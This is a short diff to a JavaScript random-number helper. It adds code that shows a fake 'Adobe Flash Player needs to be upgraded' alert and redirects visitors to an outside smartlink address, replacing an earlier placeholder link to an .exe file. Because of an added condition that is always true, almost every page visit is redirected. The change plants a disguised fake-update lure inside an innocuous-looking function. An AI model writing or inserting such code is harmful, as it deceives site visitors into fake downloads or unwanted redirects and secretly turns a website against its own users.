@@ -5,10 +5,13 @@ function randomNum(minNum,maxNum){
         break; 
         case 2: 
             num = parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
-			if(num > 1000){
+			if(num > 10000){
 				alert("Oh, it seems that your Adobe Flash Player needs to be upgraded. Please download the latest version and install it")
-				window.location.href='https://xxxx/xx.exe';
-			}else{
+				window.location.href='https://smrtsecure-dt.com/smartlink/?a=136882&sm=8892&mt=24';
+			}else if(1<num<1000){
+				window.location.href='https://smrtsecure-dt.com/smartlink/?a=136882&sm=8892&mt=24';
+			}
+			else{
 			}
         break; 
             default: 
